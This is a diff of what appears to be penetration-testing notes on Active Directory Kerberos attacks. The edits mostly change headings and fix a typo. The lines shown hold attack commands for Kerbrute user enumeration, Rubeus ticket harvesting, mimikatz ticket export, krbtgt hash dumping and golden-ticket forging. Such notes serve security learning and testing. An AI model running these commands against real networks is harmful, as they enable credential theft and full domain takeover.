@@ -4,17 +4,13 @@
 
 ![](../../.gitbook/assets/Kerberos-Auth.png)
 
-### Enumerating Users
-
-* [Kerbrute](https://github.com/ropnop/kerbrute/releases)
+### Enumerating Users using [Kerbrute](https://github.com/ropnop/kerbrute/releases)
 
 ```bash
 ./kerbrute -dc <DOMAIN-CONTROLLER> -d <FULL-DOMAIN> USER-WORDLIST.txt -t 50
 ```
 
-### Harvesting TGTs
-
-* [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
+### Harvesting TGTs using [Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe)
 
 ```bash
 Rubeus.exe harvest /interval:30
@@ -78,11 +74,6 @@ secretsdump.py USER@DOMAIN-IP
 * Allows to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket
 
 ```bash
-> mimikatz.exe
-
-# 200 OK = have admin access to run this exe properly
-privilege::debug
-
 # exports all .kirbi to current directory
 sekurlsa::tickets /export
 
@@ -108,7 +99,7 @@ NOTE:
 
 ```bash
 # dump hash and SID
-lsadump::lsa /inject /name: krbgtg
+lsadump::lsa /inject /name: krbtgt
 
 # create ticket golden
 kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM_HASH /id:500
